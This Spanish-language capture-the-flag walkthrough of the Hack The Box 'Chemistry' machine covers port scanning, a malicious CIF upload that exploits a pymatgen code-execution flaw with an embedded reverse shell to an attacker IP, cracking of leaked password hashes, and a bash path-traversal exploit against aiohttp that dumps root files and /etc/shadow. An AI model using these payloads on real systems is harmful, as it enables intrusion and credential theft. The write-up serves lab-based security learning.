
# Chemistry

<figure><img src="/files/nNnfrbqtSpPUoZUBPP0R" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Primer acceso</mark>

Añadimos la IP `10.10.11.38` a nuestro `/etc/hosts` y accedemos través del navegador.

```bash
sudo echo "10.10.11.38 chemistry.htb" | sudo tee -a /etc/hosts
```

Esta máquina no tiene abierto el puerto 80 por lo que vamos a comprobar los puertos y servicios que tiene corriendo.

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -sS -T5 10.10.11.38 
```

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

Nos encontramos 2 puertos abiertos, el 22 típico y el 5000. Nos interesa el puerto 5000, por lo que vamos a escanearlo más en detalle con Nmap:

```bash
sudo nmap -v -sCV -p 5000 -T5 10.10.11.38

PORT     STATE SERVICE VERSION
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Thu, 07 Nov 2024 21:15:55 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
<-----SNIP----->
```

Encontramos que el puerto 5000 usa una versión de `Werkzeug/3.0.3` que podría ser vulnerable.

<figure><img src="/files/eRrm45hQCRybydlu9Rb7" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/r8ub1NS7e41R6RJm5uXh" alt=""><figcaption></figcaption></figure>

Al acceder por el puerto 5000 nos encontramos un frontal con 2 CTAs: login y registro. Vamos a intentar registrarnos:

<figure><img src="/files/AFTBusWYQ3xm43NZ6n69" alt=""><figcaption></figcaption></figure>

Al registrarnos en la página llegamos a un dashboard donde podríamos subir un archivo .CIF y encima nos da un link a un archivo CIF de ejemplo que nos vamos a descargar para examinarlo:

<figure><img src="/files/lIDB2iE0nP7xehtebj0c" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/0VzAtsUddvkjQSoTxxdC" alt=""><figcaption></figcaption></figure>

Vamos a abrir el archivo `.cif` a ver que contiene:

```shell-session
afsh4ck@kali$ cat example.cif 

data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

Un archivo **`.cif`** (Crystallographic Information File) es un formato de texto utilizado principalmente en la química y la cristalografía para almacenar información estructural de cristales. El archivo `.cif` contiene datos sobre la estructura de una molécula o un cristal, incluidos detalles como las dimensiones de la celda unitaria, los ángulos, las posiciones de los átomos y otros parámetros relacionados con la cristalografía.

## <mark style="color:purple;">Búsqueda de exploits</mark>

Haciendo un poco de research nos encontramos con este artículo explotando el CVE-2024-23346:

{% embed url="<https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0>" %}

Según este artículo, podríamos explotar esta vulnerabilidad de subida de un archivo .cif de la siguiente manera:

{% code title="CIF malicioso" %}

```
 data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.15.3/4444 0>&1\'");0,0,0'
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

{% endcode %}

{% hint style="info" %}
Fijaros que en la tercera línea empezando por abajo añadimos una reverse shell hacia nuestra IP de atacante y el puerto 4444
{% endhint %}

## <mark style="color:purple;">Explotación</mark>

Vamos a subir el archivo .cif malicioso al servidor, pero antes vamos a brir un listener de netcat por el puerto 4444:

<figure><img src="/files/K3w48zZuVhGL07ePtQ6G" alt=""><figcaption></figcaption></figure>

1. Una vez subido el cif malicioso lo abrimos con el botón View
2. Recibimos una shell como el usuario app

## <mark style="color:purple;">User flag</mark>

Haciendo un poco de enumeración encontramos el usuario rosa, dentro de la carpeta home, pero no podemos acceder a la flag, necesitamos la contraseña:

```shell-session
$ cd home
$ ls
app
rosa
$ cd rosa
$ ls
user.txt
$ cat user.txt
cat: user.txt: Permission denied
```

Hacemos un [tratamiento de la TTY](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/shells-y-payloads/tratamiento-de-la-tty.md) para movernos un poco mejor y encontramos un archivo interesante que parece un archivo de volcado de una base de datos:

```shell-session
app@chemistry:~/instance$ ls
ls
database.db
app@chemistry:~/instance$ cat database.db

SQLite format 3@  �
�f�K�ytableuseruserCREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(150) NOT NULL,
        password VARCHAR(150) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
)';indexsqlite_autoindex_user_1user�3�5tablestructurestructureCREATE TABLE structure (
<----SNIP---->
```

Como es un archivo bastante grande y con muchos caracteres me lo voy a llevar a Kali Linux para analizarlo mejor. Haciendo un filtrado con grep obtenemos lo que parece un hash del usuario rosa:

<figure><img src="/files/p3i9uOuxeZhTEALgTryz" alt=""><figcaption></figcaption></figure>

```
(Mrosa63ed86ee9f624c7b14f1d4f43dc251a5'Mapp197865e46b878d9e74a0346b6d59886a)
```

En esa cadena observamos 2 hashes, separados por una comilla simple:

```
Hash de Rosa: 63ed86ee9f624c7b14f1d4f43dc251a5
Hash de App:  197865e46b878d9e74a0346b6d59886a
```

Al pasar el hash de Rosa por Crackstation nos da la contraseña en plano. También podríamos usar John o Hashcat pero en ocasiones Crackstation es más rápido:

{% embed url="<https://crackstation.net/>" %}

<figure><img src="/files/LjsaosUWmxfI6kYVgVvW" alt=""><figcaption></figcaption></figure>

Una contraseña muy propicia para el usuario Rosa... Vamos a conectarnos por ssh:

```shell-session
afsh4ck@kali$ ssh rosa@10.10.11.38

The authenticity of host '10.10.11.38 (10.10.11.38)' can't be established.
ED25519 key fingerprint is SHA256:pCTpV0QcjONI3/FCDpSD+5DavCNbTobQqcaz7PC6S8k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.38' (ED25519) to the list of known hosts.
rosa@10.10.11.38's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

rosa@chemistry:~$ id
uid=1000(rosa) gid=1000(rosa) groups=1000(rosa)
rosa@chemistry:~$ ls
user.txt
rosa@chemistry:~$ cat user.txt
32e695f95710a09ec**************
```

Funciona y obtenemos la user flag!

## <mark style="color:purple;">Escalada de privilegios</mark>

Lo primero comprobamos los permisos de ejecución, pero no tiene ningún permiso el usuario rosa:

```shell-session
rosa@chemistry:~$ sudo -l
[sudo] password for rosa: 
Sorry, user rosa may not run sudo on chemistry.
```

Vamos a enviar un linpeas a la máquina para encontrar formas de elevar nuestros privilegios:

<figure><img src="/files/6xeJ0GVsbNGVur3zVZhl" alt=""><figcaption></figcaption></figure>

Lo primero que nos marca en rojo es la versión de sudo, que al parecer puede ser vulnerable:

```
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.31
```

Probamos varios exploits de esta versión de sudo pero sin éxito en la máquina. Encontramos una web corriendo en localhost por el puerto 8080:

<figure><img src="/files/YjNYmH0Qi6u8V78iy4OR" alt=""><figcaption></figcaption></figure>

Vamos a hacer un tunneling por SSH desde nuestro Kali Linux para ver de que se trata esta aplicación:

```shell-session
afsh4ck@kali$ ssh -L 7000:127.0.0.1:8080 rosa@10.10.11.38 -fN
rosa@10.10.11.38's password: 
```

Ahora podríamos acceder a través del navegador en nuestro Kali Linux en localhost por el puerto 7000:

<figure><img src="/files/1DPi0T32pZYUgVkoIfBW" alt=""><figcaption></figcaption></figure>

Parece un portal en desarrollo ya que no funciona ninguna de las funcionalidades que tiene implementadas. No encontramos información relevante y Wappalizer no es capaz de analizar la tecnología del sitio. Con curl extraemos algo más de información:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ curl localhost:7000 --head
</strong><strong>
</strong>HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5971
Date: Fri, 22 Nov 2024 00:51:55 GMT
Server: Python/3.9 aiohttp/3.9.1
</code></pre>

Buscando `Python/3.9 aiohttp/3.9.1 exploit` nos encontramos con que es vulnerable al CVE-2024-23334, que explota una vulnerabilidad Path Traversal en la librería de python AioHTTP =< 3.9.1

{% embed url="<https://github.com/z3rObyte/CVE-2024-23334-PoC>" %}

Podemos utilizar el siguiente script en bash para explotar este path traversal y que nos devuelva la root flag:

```bash
#!/bin/bash

url="http://localhost:8080"
string="../"
payload="/assets/"
file="root/root.txt" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

#### **Funcionamiento**

El script iterativamente sube un nivel (`../`) y prueba concatenando `payload` y `file`. Por ejemplo, si el servidor tiene configurado el directorio raíz en `/var/www/html`, las rutas que intentará serían:

1. `/assets/root/root.txt`
2. `/assets/../root/root.txt`
3. `/assets/../../root/root.txt`
4. `/assets/../../../root/root.txt`
5. ... (hasta 15 niveles).

Si una de las rutas es válida y el servidor devuelve un `200 OK`, se asume que el archivo es accesible y se imprime su contenido.

#### Ejecución del exploit

Necesitamos darle permisos de ejecución con `chmod +x`:

```shell-session
rosa@chemistry:/tmp$ ./exploit.sh
-bash: ./exploit.sh: Permission denied
rosa@chemistry:/tmp$ chmod +x exploit.sh
rosa@chemistry:/tmp$ ./exploit.sh
[+] Testing with /assets/../root/root.txt
	Status code --> 404
[+] Testing with /assets/../../root/root.txt
	Status code --> 404
[+] Testing with /assets/../../../root/root.txt
	Status code --> 200
7705f58f24***********************
```

Como vemos eso nos vuelva la root flag (que estaré censurando una parte para evitar spoilers) y con esta técnica podríamos hacernos con cualquier archivo del sistema modificando el script, como por ejemplo `/etc/shadow`, donde se almacenan las contraseñas hasheadas en Linux e intentar crackear la contraseña del usuario root:

```
rosa@chemistry:/tmp$ ./exploit.sh 
[+] Testing with /assets/../etc/shadow
	Status code --> 404
[+] Testing with /assets/../../etc/shadow
	Status code --> 404
[+] Testing with /assets/../../../etc/shadow
	Status code --> 200
root:$6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW666fRaPKI8wTaTVBm5fgkaBEojzzjsF.jjH0K0JWi3/poCT6OfBkRpl.:19891:0:99999:7:::
rosa:$6$giyD4I2YumzG4k6.$0h0Gtrjj13qoK6m0XevedDBanbEz6BStzsLwUtrDm5sVkmnHOSSWF8f6W8B9btTEzyskmA2h/7F7gyvX1fzrT0:19893:0:99999:7:::
app:$6$XUL17hADm4qICsPv$QvCHMOImUTmS1jiaTQ2t6ZJtDAzgkqRhFYOMd0nty3lLwpyxTiyMWRgO/jbySPENinpJlL0z3MK1OVEaG44sQ1:19890:0:99999:7:::
daemon:*:19430:0:99999:7:::
bin:*:19430:0:99999:7:::
sys:*:19430:0:99999:7:::
sync:*:19430:0:99999:7:::
games:*:19430:0:99999:7:::
man:*:19430:0:99999:7:::
<----SNIP---->
```
